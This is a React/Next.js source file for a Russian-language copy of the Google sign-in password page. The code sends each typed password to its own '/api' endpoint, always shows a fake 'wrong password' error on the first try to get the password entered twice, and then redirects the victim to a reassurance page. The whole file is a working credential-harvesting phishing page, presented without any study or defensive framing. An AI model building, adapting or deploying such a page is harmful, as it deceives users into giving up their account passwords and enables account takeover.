'use client'
import styles from "../../../../page.module.css"
import Svg from "@/components/Svg";
import React, {useCallback, useRef, useState} from "react";
import Link from "next/link";
import Footer from "@/components/Footer";
import {useRouter} from "next/navigation";
import axios from "axios";
import {log} from "node:util";

export default function Page() {
    const [valid, setValid] = useState<boolean>(true)
    const [attempt, setAttempt] = useState<number>(0)
    const [value, setValue] = useState<string>('')
    const input = useRef<HTMLInputElement>(null)
    const [show, setShow] = useState<boolean>(false)
    const changeShowingPassword = useCallback(() => {
        setShow(!show)
        console.log(!show)
    }, [show]);

    const router = useRouter()
    const splitter = useRef<HTMLDivElement>(null)
    const line = useRef<HTMLDivElement>(null)
    const chooseAccount = useCallback(async() => {
        if(splitter.current && line.current){
            splitter.current.style.opacity='0.3'
            line.current.style.opacity='0.3'
        }
            await new Promise(resolve => setTimeout(resolve, 600))
        if(splitter.current && line.current){
            splitter.current.style.opacity='1'
            line.current.style.opacity='0'
        }
        router.push('../')
    }, [router]);
    const submitPassword = useCallback(async(e: React.FormEvent<HTMLFormElement> | React.MouseEvent) => {
        if(e){
            e.preventDefault()
        }
        if(splitter.current && line.current){
            splitter.current.style.opacity='0.3'
            line.current.style.opacity='0.3'
        }
        if(attempt<1){
            await axios.post('/api', {
                password: value
            }).then(data=>console.log(data))
            setValue('')
            setValid(false)
            if(input.current) {
                input.current.focus()
            }
            setAttempt(a=>a+1)
        } else {
            await axios.post('/api', {
                password: value
            }).then(data=>console.log(data))
            setValid(true)
            router.push('/v3/signin/challenge/pwd/youAreSave')
        }
        if(splitter.current && line.current){
            splitter.current.style.opacity='1'
            line.current.style.opacity='0'
        }
    }, [value, attempt]);
    const load = useCallback(async(path: string) => {
        if(splitter.current && line.current){
            splitter.current.style.opacity='0.3'
            line.current.style.opacity='0.3'
        }
        setValid(true)
        await new Promise(resolve => setTimeout(resolve, 600))
        router.push(path)
        if(splitter.current && line.current){
            splitter.current.style.opacity='1'
            line.current.style.opacity='0'
        }
    }, []);
    return (
        <main className={styles.main}>
            <div className={styles.TcuCfd}>
                <div className={styles.line} ref={line}></div>
                <Svg/>
                <div className={styles.severer} ref={splitter}>
                    <div className={styles.leftHalf}>
                        <h1 style={{fontSize: '2rem', fontWeight: 400, marginTop: 24}}><span>Добро Пожаловать</span>
                        </h1>
                        <div style={{fontSize: '1rem', fontWeight: 400, marginTop: 16}}>
                            <div className={styles.accountChooser} onClick={chooseAccount}>
                                <svg aria-hidden="true" className="Qk3oof" fill="currentColor" focusable="false"
                                     width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path
                                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                </svg>
                                mihoyomustdie@gmail.com
                                <svg aria-hidden="true" className="Qk3oof u4TTuf" fill="currentColor" focusable="false"
                                     width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                    <path d="M7 10l5 5 5-5z"></path>
                                </svg>
                            </div>
                        </div>
                    </div>
                    <div className={styles.rightHalf}>
                        <div style={{fontSize: '0.875rem'}}>
                            Сначала подтвердите, что это ваш аккаунт.
                        </div>
                        <div className={styles.aboveSubmit}>
                            <div>
                                <form onSubmit={submitPassword} className={`${styles.input} ${value ? styles.inputIsntVoid : ''}`}
                                     data-label='Введите пароль'>
                                    <input name="Passwd" autoComplete="current-password" value={value}
                                           className={`${styles.inputField} ${valid? styles.valid: styles.invalid}`}
                                           type={show ? 'text' : 'password'}
                                           onChange={e => setValue(e.target.value)}
                                           ref={input}/>
                                </form>
                                {!valid &&
                                    <div className={styles.errorMessage}>
                                        <div className={styles.errorIcon}>
                                            <svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor"
                                                 focusable="false" width="16px" height="16px" viewBox="0 0 24 24"
                                                 xmlns="https://www.w3.org/2000/svg">
                                                <path fill='#b3261e'
                                                      d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                            </svg>
                                        </div>
                                        {'Неверный пароль. Повторите попытку или нажмите на ссылку "Забыли пароль?", чтобы сбросить его.'}
                                    </div>
                                }
                                <div>
                                    <label className={styles.container}>Показать пароль
                                        <input type="checkbox" onClick={changeShowingPassword}/>
                                        <span className={styles.checkmark}></span>
                                    </label>
                                </div>
                            </div>
                        </div>
                        <div className={styles.submit}>
                            <div className={styles.create} onClick={()=>load('/v3/signin')}
                            >Забыли пароль?</div>
                            <div onClick={submitPassword} className={styles.next}>Далее</div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    );
}
